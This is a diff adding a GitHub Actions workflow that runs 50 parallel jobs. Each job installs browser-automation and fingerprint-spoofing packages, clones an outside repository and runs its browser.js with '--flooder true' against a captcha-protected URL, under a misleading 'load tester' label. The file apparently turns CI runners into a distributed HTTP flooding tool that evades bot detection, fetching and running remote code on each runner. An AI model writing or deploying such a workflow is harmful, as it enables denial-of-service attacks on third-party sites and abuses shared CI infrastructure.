@@ -1,0 +1,50 @@
+name: Parallel Node.js Execution
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  parallel-execution-ubuntu:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 100
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+      
+      
+          
+      
+      
+      
+      - name: Install Node.js dependencies
+        run: npm install puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer hpack
+            
+      
+      
+      - name: Run HTTP/3 load tester (if Python script exists)
+        run: |
+          git clone https://github.com/Fegp1p2/ideal-guide.git
+          cd ideal-guide
+          xvfb-run -a node browser.js https://captcha.dstatbot.win/NKf9RWGZ 700 4 64 m.txt --debug true --flooder true
+        env:
+          INSTANCE_NUMBER: ${{ matrix.instance }}
+          TOTAL_INSTANCES: 50
+          RUNNER_OS: ubuntu
